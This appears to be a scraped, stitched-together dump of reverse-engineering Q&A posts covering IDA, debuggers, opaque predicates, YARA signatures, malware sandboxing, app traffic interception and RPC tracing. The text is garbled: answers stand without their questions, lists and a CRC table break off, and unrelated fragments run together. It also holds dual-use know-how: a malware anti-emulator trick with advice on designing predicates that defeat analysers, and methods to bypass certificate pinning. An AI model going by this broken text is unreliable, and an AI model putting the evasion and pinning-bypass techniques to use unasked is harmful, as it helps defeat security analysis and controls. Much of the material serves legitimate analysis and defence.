<p>Or, what's even easier and makes even more sense: Add the same INT3, and set <code>AeDebug</code> to the same <code>cdb.exe</code> command-line as you would put in IFEO and connect WinDbg to it after you log in.</p>

</code></pre>
","<p>Here's an explanation for what I think the individual symbols mean. I'm basing this around the presumption that a little selector is going through the cells, one by one.</p>

<ul>
<li><code>\xFF</code> = Null cell</li>
<li><code>\x05</code> = A string is following, with <code>\xNumber</code> coming after the string to define how far to displace the string from the selector's current position, if at all. </li>
<li><code>\xNumber string</code> = A string of length number</li>
<li><code>\x2A</code> = Could be a byte that says not to displace the current string, and also to assume that the next piece of data is defining a string to be placed in the next cell. Questionable meaning.</li>
<li><code>\x04 \xNumber</code> = Move selector ahead <code>\xNumber</code> cells and place previous string into there.</li>
<li><code>0 \x00 \x0Number</code> = New column, move selector into row <code>\xNumber</code>, and place previous string into there.
<code>@</code> = Place previously used string in the cell following the current one.</li>
</ul>

<p>So here's my interpretation of the data you're giving us:</p>

<ul>
<li><code>\xFF\xFF</code> = two null cells</li>
<li><code>\x05</code> = A cell, singular, with a string, placed following the null cells, because of the <code>\x2A</code> following the string </li>
<li><code>\x04 test</code> = The string.</li>
<li><code>\x2A \x05 test1</code> = Another string placed into the cell following. No number needed, since \x2A implies that it's being placed right after ""test""</li>
<li><code>@</code> = Place ""test1"" into the cell after the ""test1"" string was first placed.</li>
<li><code>\x04 \x03</code> = Move selector ahead three cells and place test1 where it lands.</li>
<li><code>@@</code> = Place into the two cells following also.</li>
<li><code>\x04 \x05 @</code> = Skip four cells, place into two cells.</li>
<li><code>0</code> = New column.</li>
<li><code>\x00 \x00 @</code> = Using string last defined (test1), place into first two cells of the column. </li>
<li><code>\x05 \x05 test2 \x03</code> = Place a cell three cells afterwords.</li>
<li><code>\x05\x05test1\x06</code> = Place test1 into a cell 6 after test2</li>
<li><code>@</code> = Place test1 again, too.</li>
<li><code>0</code> = move to next column</li>
<li><code>\x00\x01</code> = Place previous string at location 01 </li>
<li><code>@</code> = And also at location 02</li>
<li><code>\x00</code> = Done</li>
</ul>

<p>Explanation: My method was to look for a pattern, check if the pattern withstood further scrutiny - the first pattern I checked seemed to - and clear up any minor issues I had with it. Seems to have worked.</p>

"Struct with negative offset in IDA possible","1374","","<p>I have a structure which looks like this:</p>

<pre><code> RefString struct
     RefCount dd ?
     StrLen   dd ?
     CString  db...
 RefString ends
</code></pre>

<p>When the code passes around a pointer, it doesn't point to the beginning of the struct (RefCount), instead it points to CString, which is allocated as a normal C-String with a zero terminating character, as well as having the strlen and a refcount. So when the code accesses the strlen or refcount it uses <code>ptr-4</code> respectively <code>ptr-8</code>.</p>

<p>Actually that's quite a nice construct, because this way the string can be used as a delphistring, but also directly passed to some system functions without the need of converting back and forth. </p>

<p>Now I wonder though, if it is possible in IDA to create a struct with the basepointer to the string and it knows that the other fields are with the negative offset.</p>
","<p>What you referring to as ptr-4 and ptr-8 are in fact location of singled out variables on stack. IDA has to know the structure in order to recognize it automatically. If you setup custom structure in ""Structures"" subview. Subsequently, You can manually set whatever variable you choose to be the type of that particular variable. Thereafter, IDA will replace references within disassembly view with appropriate offsets to the structure members.  </p>

<p>If IDA ""lands"" in what seems to be the middle of the structure. You could follow the work around below to make it display it differently:</p>

  <ol>
  <li>invert the operand sign by pressing _ (underscore)</li>

<p>If a piece of malware hooks the Interrupt Descriptor Table (IDT) and substitutes its own <code>INT 1</code> and <code>INT 3</code> handlers that perform system call-like functionality, how can I use a debugger to trace its execution?  Or am I stuck with using static-analysis tools?</p>

"How to design opaque predicates?","1370","","<p>Opaque predicate are used to disrupt automatic analysis of the binary code by reaching the limits of what can do an analyzer.</p>

<p>Can somebody give an example (or a few examples) of an opaque predicate found in a real-life case ? And, what are the methods used to build new opaque predicates ?</p>
","<p>One opaque predicate I found in a malware sample years ago:</p>

<pre><code>SetErrorMode(1024);
if ( SetErrorMode(0) == 0 )
  SayHiToEmulator();
DoRealStuff();
</code></pre>

<p>As for the other question, how to build new opaque predicates, I think it depends on the kind of analyser you want to disrupt. It's different to disrupt a static code analyser designed to find bugs than disrupting an emulator designed to mimic the environment where a malware should run in.</p>

<p>But, let's say that you want to disrupt malware emulators: you can build a list of APIs from the most common libraries (kernel32.dll, advapi32.dll, user32.dll, etc...), create a batch of proves where you execute those APIs changing the arguments and checking the return values and generated exceptions, if any, and save the results. Then check the results of such APIs and find candidates: For example, a return value related to the input to such APIs is a good candidate for an opaque predicate. Specific conditions (exceptions or return values) that only happen rarely and with certain specific inputs are even better. Just some ideas...</p>

<p>Given that ATMs are relatively hardened (in comparison to say, most consumer electronics for example), what would be the process of reverse engineering a device in a black-box AND limited access scenario?</p>

<p>Given that traditionally, an end user of a device such as an ATM will only ever have access to the keypad/screen/card input/cash outlet (at a stretch, access to perhaps the computer housed in the top of the plastic casing(think private ATMs at small stores etc)), it seems like most attack vectors are quite limited. Under these types of circumstances, what could be done to reverse, understand and potentially exploit hardened, limited access systems?</p>

<p>Is the 'ace up the sleeve' kind of situation here physical access to the ATM components? Or is there a way to RE a device from within the environment a user is presented?</p>

"How to create a virus signature from decompiled source","1364","","<p>I have a problem where I have to create a virus signature for the Stoned Virus (Although this could apply to any virus/file).</p>

<p>Let's assume I have a copy of the compiled and decompiled program. I then proceed to identify the most important parts of the virus, that will always be present, in the code. As I understand it I now have to find the corresponding bytes in the compiled virus in order to create a byte signature for that critical part of the virus.</p>

<p>How do I proceed to find the corresponding bytes in the compiled source from the code that I identified in the decompiled version?</p>

<p>Extra:</p>

<ul>
<li>The code is in assembly</li>
<li>Simply using a hash signature for the entire file is not an option</li>
<li>Currently I only have the assembly code, but I can always compile this</li>
<li>I am aware that Stoned would usually be located in the boot sector and not in a file. This is only an academic exercise and would be relevant to any virus.</li>
</ul>

<p>EDIT:</p>

<p>The purpose of this is to be able to create virus signatures that can be used to scan a file system to find infected files as well as possibly infected files and variations of the virus code. For this reason I cannot simply use a hash of the entire file and I need to use specific parts of the virus. I can identify those parts but I do not know how to find the matching bytes in the machine code for the viral parts I identified.</p>
","<p>There are a number of ways to do this. Some people new to signature scanning use MD5 hashes of the entire file. This is <em>VERY</em> flawed, due to the switching of registers or even just the timestamp of the file would change the entire signature.</p>

<p>Another method often used is YARA ( <a href=""http://plusvic.github.io/yara/"" rel=""nofollow"">http://plusvic.github.io/yara/</a> ).
A good example from their webpage:</p>

<pre><code>rule silent_banker : banker
{
    meta:
        description = ""This is just an example""
        thread_level = 3
        in_the_wild = true

    strings:
        $a = {6A 40 68 00 30 00 00 6A 14 8D 91}
        $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9}
        $c = ""UVODFRYSIHLNWPEJXQZAKCBGMT""

    condition:
        $a or $b or $c
}
</code></pre>

<p>Here they say that one of the A, B or C bytes should be within the file.</p>

<p>Another method used (however this is more a Heuristic method) is to detect the ways it tries to hide. Eg obfuscation, encryption odd jumps (like pop, ret to jump to addresses).</p>

<p>Another method used often, (although this is less signature based) is IOC, for this see: <a href=""http://www.openioc.org/"" rel=""nofollow"">http://www.openioc.org/</a></p>

<p>I think you are looking for YARA.
Note for writing YARA signatures, good malware/exploits authors randomize everything they can. So try to find the parts that are 'unchangeable'.</p>

"Malware in virtual machines","1364","","<p>Once I perform static analysis on a malware sample, I next run it in a virtual machine.</p>

<ul>
<li>Does this give the malware a chance to spread to the real machine?</li>
<li>Does this give the malware a chance to spread across networks?</li>
<li>What steps/tips can I follow to prevent the malware from spreading from the VM?</li>
</ul>

<p>I use VMwareW.</p>
","<p>The malware can propagate from the VM to the host in several circumstances:</p>

<ul>
<li>If there's a bug in the VM software. That's not very common, but it's possible.</li>
<li>If there's a bug in the host OS. A bug that specifically allows malware to break out of a VM is unlikely but again possible.</li>
<li>If there's a bug in the processor. That's even more unlikely but still not mathematically impossible.</li>
<li>If there's a way for the malware to exchange information with the host. This can be over the network; in this respect, there's no difference between using a VM and using a separate physical machine, so you need to firewall the VM appropriately (allow only the bare minimum, don't do anything that might allow the server to hijack the client such as SSH with X forwarding). Another vector is via the VM tools such as file and clipboard sharing: the software running in the VM might read and write shared files, access the host clipboard, etc. So when running malware in a VM you should disable all these convenience tools (disable them in the VM configuration, it's not enough to refrain from installing the guest software since the malware could come with its own).</li>
</ul>

<p>For more on that topic, read <a href=""https://security.stackexchange.com/questions/9011/does-a-virtual-machine-stop-malware-from-doing-harm"">https://security.stackexchange.com/questions/9011/does-a-virtual-machine-stop-malware-from-doing-harm</a> and <a href=""https://security.stackexchange.com/questions/12546/is-it-safe-to-install-malware-in-a-vm"">https://security.stackexchange.com/questions/12546/is-it-safe-to-install-malware-in-a-vm</a></p>

<p>All in all, most malware can be analyzed safely in a properly configured virtual machine. Disable all guest features and don't connect to the VM with any protocol that allows the server to influence the client. Firewall the VM as if it was hostile (it is); you should use a host-only network so that you can easily control what goes there.</p>

<p>There's another reason why you might prefer a physical machine to a virtual machine. There's quite a bit of malware that attempts to detect whether it's being analyzed, and doesn't behave maliciously when it is. Obvious, common things that malware tries to detect is signs that it's running under a debugger: check if it's being ptraced (or the Windows equivalent), check for sudden pauses in the execution, … And some malware looks for telltale signs of a VM, such as drivers for hardware that common VM software emulates, or CPU oddities that are inexistent or rare outside emulated CPUs. This isn't to say that you cannot analyze malware in a VM: sometimes you can, sometimes you can't, it depends on the malware. If you start in a VM and find nothing you need to be prepared to move to a physical machine.</p>

<p>Note that there are risks with a physical machine too: malware could attempt to <a href=""https://security.stackexchange.com/questions/7204/is-making-a-clean-install-enough-to-remove-potential-malware"">plant itself</a> into one of the <a href=""https://security.stackexchange.com/questions/25473/where-can-a-virus-or-other-malware-hide-on-common-pc-and-mac-hardware"">many pieces of firmware</a> on the motherboard and <a href=""http://semiaccurate.com/2009/07/31/apple-keyboard-firmware-hack-demonstrated/"" rel=""nofollow noreferrer"">peripherals</a>. Toolkits for this are beginning to emerge, such as <a href=""http://www.toucan-system.com/research/blackhat2012_brossard_hardware_backdooring.pdf"" rel=""nofollow noreferrer"">Rakshasa</a> and <a href=""https://security.stackexchange.com/questions/7181/does-the-mebromi-bios-flashing-rootkit-mean-apts-for-personal-computers-are-here"">Mebromi</a>. So if you analyze some sophisticated malware on a physical machine, don't trust this physical machine any more, ever.</p>

What you do is that you change your hosts file so that the Store executable connects to SSLNetcat running locally, then you set up SSLNetcat such that it uses a cerificate for which you have the private key. Then you either just have SSLNetcat forward the data directly to a program of your choice or enter the private keys into Wireshark and use it to sniff the traffic.</p>

<p>If the data isn't HTTPS, if the cerificate in the binary is pinned and not stored in a file, you can either patch the Windows Store executable and replace the certificate with your own for which you have the private key. OpenSSL should be able to generate a replacement certificate for you easily. This private key can then be entered into Wireshark which will then decrypt the traffic.</p>

<p>and you put breakpoint on address 0x00D, in this case the process will get SIGTRAP on other address than 0x000D, but gdb only knows the 0x00D address from the user input so its just throw SIGTRAP and get stuck.</p>

<p>Also even when you write the right address to gdb, the arm fallback mode of gdb can cause this kind of problems. </p>

<pre><code>set arm fallback-mode (arm|thumb|auto)
GDB uses the symbol table, when available, to determine whether instructions are ARM or Thumb. This command controls GDB’s default behavior when the symbol table is not available. The default is ‘auto’, which causes GDB to use the current execution mode (from the T bit in the CPSR register).

<p>Some times gdb cant get the arm mode of a function automatically, and it falling to the wrong mode. You can check this by disassemble piece of code in gdb and check if you see normal assembly or some bad one. if its bad one then your arm assembly mode is wrong, and you can get false SIGTRAP.</p>

<p>Another advice is not to use gdb in iOS, use lldb. gdb is depreciated, and the only gdb versions available to iOS are ports thats individual people wrote, those ports lack in features (for example some of them don't have the fallback feature at all), and are unreliable.  </p>

<p>The code loads some value into R1 (a), then (b) adds PC to it. So, the value of the register is supposed to be a pointer into memory, but beause PC gets added later, the value that is loaded at 2645C wouldn't make any sense. Ida detects the ADD instruction, and shows the LDR instruction in a way that lets you see where it's supposed to point to.</p>

<p>The fact that the ""correcting offset"" of 0x62474 is not the address of the <code>ADD</code> instruction is because of pipelining within the processor; at the moment the <code>ADD</code> gets executed, the next instructions have already been read, so PC is two instructions ""behind"" where the <code>ADD</code> instruction is located.</p>

<p>(The reason why the compiler produces this kind of code is, when the same code gets loaded at a different address later it stays valid, even without the relocation patching the linker/loader would have to do otherwise. That's called PIC, or Position-independent code.)</p>

","<p>I see you're mixing up sections with functions.</p>

<p>What you have provided in your question are functions necessary to an ELF binary to execute. For example, the <code>_start</code> function is usually the <em>entry point</em> of a binary and it will probably call the <code>main</code> function at some point. You can get the address of the entry of a binary using <code>readelf -h</code> on the binary file you have.</p>

<p>About the output, though your program is ""empty"" it was still compiled &amp; linked successfully - for that it is not erroneous - into an executable ELF. This document provides everything you need to know about how an ELF binary is structured &amp; how to manipulate it : <a href=""http://www.skyfree.org/linux/references/ELF_Format.pdf"">ELF Format</a> (PDF).</p>

<p>Now if you want to retrieve section information in a binary file the <code>readelf</code> function can again help with that, you just have to call it with the <code>-S</code> and the target binary file (<code>readelf -S prog</code>).</p>

<p>Since you're just starting to learn, I recommend you checking the binutils (<code>readelf</code>, <code>objdump</code>, ...) and their related documentation and start playing with simple programs before moving to crackmes and more advanced or obfuscated binary files.</p>

<ul>
<li>Run apktool on the APK. I got a few XML files, including the AndroidManifest, but no source. Apparently this is because there is no classes.dex in the package.</li>
<li>Noticing that there's a KnoxAttestationAgent.odex in the arm64/ folder, I tried to run baksmali 2.1.1 on it. However, this version apparently doesn't support Android 5 versions of oat. The S6 firmware I'm working on is 5.1.1.</li>

<li>I tried to run AndroGuard on the APK, but was also unsuccessful. A bunch of errors.</li>

","<blockquote>

</blockquote>

<p>That's because these are odexed apps: when an app is odexed, the classes.dex is extracted from the apk.</p>

<blockquote>
  <p>I tried an earlier version of baksmali 2.0.8 which doesn't have the limitation, but I get another error ""KnoxAttestationAgent.odex is not an apk, dex file or odex file.""</p>
</blockquote>

<p>That's right, because the .odex file is not an apk. An odex file is basically an optimized version of the classes.dex</p>

<p>So, in order to disassemble this app, you have to deodex it.</p>

<p>Here is an HOW-TO guide (I haven't tested it personally): <a href=""http://www.naldotech.com/how-to-deodex-applications-on-android-5-0-lollipop/"" rel=""nofollow"">http://www.naldotech.com/how-to-deodex-applications-on-android-5-0-lollipop/</a></p>

<p>Eventually, if you follow all the steps correctly, you will have an apk ready to be reversed using APKTool. 
Good luck.</p>

<p>I did find reference to a CRC checksum in the Watlow Modbus documentation. However I have no idea what the polynomial is. Any ideas?</p>
","<p>I downloaded the <a href=""http://www.watlow.com/downloads/en/software/ezzone.cfm"">EZ-ZONE Configurator</a> and reverse engineered it to see how it works.</p>

<p>The serial data you're seeing is actually the <a href=""http://en.wikipedia.org/wiki/BACnet"">BACnet</a> MS/TP (master-slave/token-passing) protocol. You can find the <a href=""https://www.wireshark.org/"">Wireshark</a> protocl decoder for it <a href=""http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-mstp.c"">here</a>. However, to save you the time, I'll help you get to the meat of calculating those check bytes.</p>

<p>In BACnet parlance, <code>55 FF</code> is called the ""preamble"", the first check byte is called the ""Header CRC"", the last two check bytes are called the ""Data CRC"", etc. For simplification though, let's call <code>b[]</code> your byte array: <code>b[0]</code> = <code>55</code>, <code>b[1]</code> = <code>FF</code>, etc.</p>

<p>The first check byte (a.k.a. ""Header CRC"") (<code>b[7]</code>) is calculated using the BACnet 8-bit CRC as follows.</p>

<p>We first define our CRC table:</p>

<pre><code>BYTE crc[256] =

<p>Perform a CRC-16 of the 6 bytes between the first check byte and the last two check bytes (in your first example, this would be the bytes <code>01 03 01 04 01 01</code>), with <code>0xFFFF</code> (<code>-1</code>) as the initial value for the CRC-16, and <code>0x8408</code> as the polynomial. Then bit-flip (a.k.a. ""not"", a.k.a. ""invert"") the result and read it in little-endian.</p>

"Deobfuscating IDA Pseudocode","1320","","<p>I have wanted to get into the art of reverse engineering for quite some time now, so I took a look at a few online lessons (such as opensecuritytraining.info) and also got my hands on IDA Pro.</p>

<p>Obviously, since this is a complex topic, I was overwhelmed by registers, pointers, instructions et cetera. I know assembler and C fairly well, it's just (like I said earlier) a topic where you have to learn much.</p>

<p>Now to my actual question: I have downloaded a ""CrackMe""-Program and started debugging it. Basically the objective is to find a key which you then have to enter into a Textbox in the program. I found the key checking function fairly easily and identified some logic, but I can't wrap my head around how the program actually compares the string. My C skills are much greater than my Assembler skills, so I decided to get some Pseudocode printed. The problem is that the Pseudocode is pretty messy (I'm guessing that's because of compiler optimizations) and I basically can't understand what this piece of code is supposed to do.</p>

<p>I would appreciate it if someone could give me advice on how to ""deobfuscate"" this piece of code. Are there any plugins available to do this? Is there a special technique that I can use to figure it out? Would it be better to look at the Assembler code instead of the Pseudocode?</p>

<p>I especially wonder where these weird constants (like 872 for example) come from.</p>

<p>Answers would be highly appreciated.</p>
","<p>IDA Pro is no magic tool to automatically decompile binaries to their source code. The decompiler output should not be relied every time (as compiling leads to loss of information) although IDA boasts of the finest decompiler available. Instead focus on the disassembly listing. For specific parts, you can use the decompiler output as your reference.</p>

<p>Deobfuscation is a multi-step process. First try to understand the usages of <em>variables</em>, <em>structures</em>, etc and then give them a more easy-to-understand names reflecting their purpose. In many cases you can understand the variables purposes by just noting how it is used in function calls. For example <code>Vcl.Controls.TControl.GetTextLen</code> returns the length of the control's text. That means among the parameters passed, one must be the a pointer to the <code>TControl</code>. You can use this information to rename variables.</p>

<p>In case of <code>VCL</code> binaries, <em><a href=""http://kpnc.org/idr32/en/"" rel=""nofollow"">Interactive Delphi Reconstructor</a></em>, will give you more easy-to-understand disassembly, as it is geared for that purpose. IDR also has a somewhat very limited decompilation capability.</p>

<p>For better understanding IDA Pro and its myriad of features, I would recommend to go through these two books <em><a href=""http://rads.stackoverflow.com/amzn/click/1593272898"" rel=""nofollow"">The IDA Pro Book</a></em> and <em><a href=""http://rads.stackoverflow.com/amzn/click/159749237X"" rel=""nofollow"">Reverse Engineering Code with IDA Pro</a></em> </p>

"Reverse engineer a proprietary save/file format structure","1320","","<p>I am working on automating some functionality within a closed-source third party application; I want to automate the creation of ""Project Files"" (in its simplest form, just a collection of video files in a specific order). The video files which this application works with each have an associated metadata file, and I have already managed to understand and recreate 99% of its format. Both these ""project files"" and the metadata files are more-or-less plain XML (with some strange tag names I have yet to decipher).</p>

<p>There are <strong><em>many</em></strong> DLL files in the applications directory, and I was thinking that maybe monitoring their use during a save operation (of a project file in the application) could point me in the right direction? If so, how could I go about this? I have also began learning DLL injection, and was wondering if this could be of use?</p>
","<p>Ok, this can be tackled in a great number of ways. As you recently learned DLL injection a fun exercise is to use this knowledge to overwrite a function :) </p>

<p>A good start is the <a href=""https://www.htbridge.com/publications/inline_hooking_in_windows.html"" rel=""nofollow"">Inline Hooking in Windows Presentation by High-Tech Bridge</a> and <a href=""http://www.codeproject.com/Articles/2082/API-hooking-revealed"" rel=""nofollow"">this codeproject</a> page.

This allows you to trace-back by walking the return values to determine the flow of the data. You can also examine the way data is written (once or by chunks).</p>

<p>You can also Trace the application, check the addresses of data that is collected, see if it gets parsed though some kind of encryption or compression algorithm. </p>

"Visual View in radare2 while debugging","1311","","<p>I am using radare2 in debugging mode (r2 -d ./program).
I set up a breakpoint at a certain address (<code>db 0x12341234</code>)
And next I have entered Visual View using: <code>V!</code></p>

<p>Following some tutorials, I saw them using '<code>s</code>' to switch to the next instruction, but that isn't working for me.
Also this is not working:</p>

<blockquote>
  <p>Maybe a simpler method to use debugger in radare is to switch it to visual mode. That way you will not have to remember many commands nor to keep program state in your mind. To enter visual mode use <code>V</code>:</p>

<pre><code>[0xB7F0C8C0]&gt; V
</code></pre>
  
  <p>The initial view after entering visual mode is a hexdump view of current target program counter (e.g., EIP for x86). Pressing <code>p</code> will allow you to cycle through the rest of visual mode views. You can press <code>p</code> and <code>P</code> to rotate through the most commonly used print modes. Use <kbd>F7</kbd> or s to step into and <kbd>F8</kbd> or <code>S</code> to step over current instruction. With the <code>c</code> key you can toggle the cursor mode to mark a byte range selection (for example, to later overwrite them with <code>nop</code>). You can set breakpoints with <kbd>F2</kbd> key.</p>

<p>Any key I would press does nothing. Am I missing something or?</p>

<p>I am talking about this view.</p>
","<p>First of all, make sure you run the latest version of radare2 from git repository:</p>

<pre><code>$ git clone https://github.com/radare/radare2.git
$ cd radare2
$ ./sys/install.sh
</code></pre>

<p>If you don’t want to install the git version or you want the binaries for another machine (Windows, OS X, iOS, etc) check out the <a href=""http://radare.org/r/down.html"" rel=""noreferrer"">download page</a> at the radare2 website.</p>

<p>radare2 has several different Visual Views, before I'll explain them - please analyze the program using <code>aa</code> and seek to a function using <code>s &lt;function_name&gt;</code>. You can list the functions recognized by radare2 using <code>afl</code>.</p>

<ul>
<li><code>V</code> - The basic Visual Mode. You can toggle between the views using
<code>p</code> and <code>P</code>.</li>
<li><code>VV</code> - Visual Graph Mode, Displays an ASCII graph
view. Again you can toggle between the views using <code>p</code> and <code>P</code>.  </li>
<li><code>V!</code> - Visual Panels Mode, which is the mode you attached to your
question.</li>
</ul>

<p>In each of the modes mentioned above you can press <code>?</code> in order to list the commands available. The commands varies between the different modes.</p>

<p>Pressing <code>s</code> and <code>S</code> inside a Visual view while debugging will step-in and step-over respectively. radare will automatically sync the view with <code>eip</code> on every step.<br>
In Visual Panels Mode (<code>V!</code>) you can use <code>TAB</code> to navigate between the panels and h/j/k/l to move inside the view/panel.<br>
You can run r2 commands from inside Visual Mode using <code>:</code> (ie. <code>s 0x00402c1e</code>).  </p>

<p>If it still doesn't work and you believe it's a problem with radare please <a href=""https://github.com/radare/radare2/issues"" rel=""noreferrer"">open an issue</a> and the great contributors of radare2 will be happy to help you.</p>

"Reverse engineering an application's client connection to a host","1307","","<p>Ok guys, I'm a web programmer but I'm completely new to reverse engineering..</p>

<p>So, there's this android app called InstaMessage, I'd like to reverse engineer the client's connection to the server, so that I can emulate it on my computer and see what commands are there, perhaps play with it a bit and further create some scripts to act as my user actions</p>

<p>I was thinking of monitoring the traffic, seeing where it leads and which port, an try to start from there.</p>

<p>I know it's a kind of broad question, so if you could give me some tips on where to start off, it would help a lot..</p>

<p>Thanks</p>
","<p>I did this with a lot of Android apps so I'll share what I have learned.</p>

<p>When thinking of sniffing traffic, the first thing that comes to mind is ""I'll just root the Android device, run tcpdump on it and I'm done"". That works for simple things, but it gets really messy really fast. And if the app uses SSL (like 99% of what's out there) it's even worse.</p>

<h1>Use a proxy</h1>

<p>Most apps use HTTP/HTTPS to communicate with the server. The easiest way to sniff that kind of traffic is using a sniffing proxy (also called debugging proxy). Common ones are <a href=""http://www.charlesproxy.com/"" rel=""nofollow"">Charles</a> and <a href=""http://www.telerik.com/fiddler"" rel=""nofollow"">Fiddler</a>. I use Charles, so I'll show you how to work with it, but Fiddler should be similiar.</p>

<p>First off, you need your computer and your Android device on the same LAN. Upon starting Charles, it will automatically start proxying your computer's traffic. You probably don't want this, so disable it from Proxy -> Proxy Settings... -> Windows. Now point your Android network settings to use your computer as HTTP proxy (Charles default port is 8888). Charles will show you all HTTP traffic from your device.</p>

<p>If you need SSL (HTTPS) proxying, you have to install the Charles certificate on your device. Android requires you to have a protected (at least pattern) lockscreen to install external certificates. You can find the certificate in the doc/ directory in Charles' install path, or you can visit <a href=""http://www.charlesproxy.com/getssl/"" rel=""nofollow"">http://www.charlesproxy.com/getssl/</a> from your device browser. Then, in Charles, go to Proxy -> Proxy Settings... -> SSL, enable SSL proxying and add the hosts you want to proxy (or just add <code>*</code> to proxy everything).</p>

<h1>Non-HTTP(S) communication</h1>

<p>An HTTP debugging proxy will cover most apps out there. In case the app is not using HTTP(S) things get a little more complex. You may want to look into the SOCKS proxy capability of Charles, and how to configure a SOCKS proxy on your device. If that doesn't suffice, then you'll really want to break out tools like tcpdump/Wireshark. You could set up a fake DNS, ARP spoof the device, use a sniffing VPN, etc. There are a lot of ways to go about it. A fake DNS is also good if you want to emulate the server, instead of the client.</p>

<h1>SSL certificate checking</h1>

<p>When dealing with SSL, most apps trust what the OS trusts. Since you can intall external certificates on Android, you're good. Rarely, the app will check the server certificate against an embedded CA root. This can be bypassed in a few ways:</p>

<ul>
<li>Using tools like apktool and smali, inject your own certificate into the app, replacing the original one;</li>
<li>Write an xposed module that hooks the data send/receive methods, to sniff the decrypted messages;</li>
<li>Write an xposed module that hooks the certificate checking routine, bypassing it.</li>
</ul>

<p>I would go with the first or the last one.</p>

<h1>Decompilation</h1>

<p>At some point you'll have to look at the application code. Maybe it's using a proprietary binary protocol, maybe the traffic is encrypted or compressed, maybe you can't make sense of some values. I suggest trying multiple decompilers/engines. They are not perfect, and a lot of times one works well where the other fails. <a href=""http://virtuous-ten-studio.com/"" rel=""nofollow"">Virtuous Ten Studio</a> is a good one to start with. Then I alway extract the classes.dex file from the APK (it's just a ZIP file) and run it through dex2jar. I then run the resulting JAR through JD-GUI (JD-Core engine) and SecureTeam Java Decompiler (Procyon engine). Also, jadx can target DEX directly, without dex2jar.</p>

<h1>InstaMessage</h1>

<p>I checked the app you're trying to reverse. It's using standard HTTPS communication, easy to sniff using either Charles or Fiddler. The server has various GET endpoints and the client sends a base64-encoded <code>data</code> field. This is binary data, I haven't really looked into it but the first 70% is identical in all requests, so I suspect it's some kind of session token. The final part varies with requests, but the whole field is pretty high entropy so I'm thinking it's either compressed or encrypted. I would try to decompile the app and see what's going on. The server response, on the other hand, is plain JSON.</p>

<p>From the <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa378503(v=vs.85).aspx"" rel=""noreferrer""><code>RPC_CLIENT_INTERFACE</code></a> struct above, we can extract the <code>InterfaceId</code> GUID: <code>4F32ADC8-6052-4A04-8701-293CCF2096F0</code></p>

<p>We can now look up that interface GUID with <a href=""http://www.rpcview.org/"" rel=""noreferrer"">RpcView</a> to find the associated DLL, running process, and endpoints:</p>

<p><img src=""https://i.stack.imgur.com/T4JZp.png"" alt=""Interfaces"">
<img src=""https://i.stack.imgur.com/b1JI5.png"" alt=""Process"">
<img src=""https://i.stack.imgur.com/XRV4Z.png"" alt=""Endpoints""></p>

<p>To find out which specific endpoint is being used by the SSPI RPC server in the LSASS process, we can reverse engineer <code>sspisrv.dll</code>. In the exported function <code>SspiSrvInitialize()</code>, we see the following call:</p>

<pre><code>RpcServerUseProtseqEpW(L""ncalrpc"", 0xAu, L""lsasspirpc"", 0);
</code></pre>

<p>To figure out which specific function is being called in <code>sspisrv.dll</code>, we need to look at the <code>pFormat</code> data passed to <code>NdrClientCall2</code>. In your example code above, the <code>pFormat</code> data is:</p>

<pre><code>00 48 00 00 00 00 06 00-4c 00 30 40 00 00 00 00 ...
</code></pre>

<p>If we parse the <code>pFormat</code> data as an <a href=""http://doxygen.reactos.org/d5/d5b/structNDR__PROC__HEADER__RPC.html"" rel=""noreferrer"">NDR_PROC_HEADER_RPC</a> structure, we get:</p>

<pre><code>handle_type = 0x00
Oi_flags    = 0x48
rpc_flags   = 0x00000000
proc_num    = 0x0006
stack_size  = 0x004C
</code></pre>

<p>From <code>proc_num</code>, we can see that this RPC call is calling the 6th RPC function in <code>sspisrv.dll</code>. We can use RpcView again to get the address for the 6th RPC function:</p>

<p><img src=""https://i.stack.imgur.com/ihKKv.png"" alt=""Procedures""></p>

<p>And with IDA Pro, we can see the function in <code>sspisrv.dll</code> at address <code>0x7573159D</code>:</p>

<pre><code>.text:7573159D __stdcall SspirProcessSecurityContext(x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x) proc near
</code></pre>

<p>RpcView also shows us a decompilation of that function's prototype:</p>

<p><img src=""https://i.stack.imgur.com/yP5dk.png"" alt=""Decompilation""></p>

<p>(Note that on your computer, the 6th function might not be at virtual address <code>0x7573159D</code>, and furthermore, the 6th function might not be <code>SspirProcessSecurityContext()</code>, but this is the approach you would use nonetheless.)</p>

<p>As such, we can now say the following:</p>

<ul>
<li>The RPC server code for your <code>NdrClientCall2()</code> call is in <code>sspisrv.dll</code></li>
<li>The RPC server for your <code>NdrClientCall2()</code> call is running in LSASS's process</li>
<li>The endpoint for your <code>NdrClientCall2()</code> call is named <code>lsasspirpc</code></li>
<li>The RPC server function called by your <code>NdrClientCall2()</code> call in <code>sspisrv.dll</code> is <code>SspirProcessSecurityContext()</code></li>
</ul>

"How to retrieve native asm code from .NET mixed mode dll file?","1292","","<p>This is seriously one question I couldn't find the answer to anywhere on Google.com</p>

<p>When I mean mixed mode I mean .NET application which has unmanaged and managed code together.</p>

<p>I used tools
.NET Reflector 6 that crashes on native methods or shows only signature to them.
Also used dnEditor v0.76 beta which doesn't ever crash but also doesn't show any native x86 assembly for the areas it couldn't decompile.</p>

<p>I get code like this</p>

<pre><code>[SuppressUnmanagedCodeSecurity]
[MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig)]
public unsafe static extern byte WritePointer(uint uint_1, void* pVoid_1, int int_4, int int_5, __arglist);

<p>Yet no way to see the x86 assembly for this method.</p>

<p>I thought about injecting this dll file to a application then attaching ollydbg to it so I could dump the dll file and check it out in IDA PRO but this also doesn't work.</p>

<p>IDA PRO 6.8 by default doesn't even load mixed .NET programs as both .NET IL Code and decompilable native asm..</p>

<p>I ran out of options here, I'll try getting a real dll file and nopping it out somewhere in the middle and pasting the binary there maybe this way IDA PRO would detect it as a unmanaged dll file.</p>

"Lifting up binaries of any arch into an intermediate language for static analysis","1290","","<h2>Background</h2>

<p>As the title is self-explanatory, I would like to translate binaries of any architecture (e.g. x86, ARM, ARM Thumb) to an intermediate language in order to apply arch-independent static analysis.</p>

<p>To be exact, my work is confined to the shared objects supplied in APK files for Android platform. My basic requirements, which I would expect the IL to meet, is as follows (Actually my goal is to extract information flows from a given <code>.so</code> file supplied in an APK file).</p>

<ul>
<li>Binary slicing</li>
<li>PDG (CFG/DFG)</li>
<li>Well-supported by its maintainer or its community</li>
</ul>

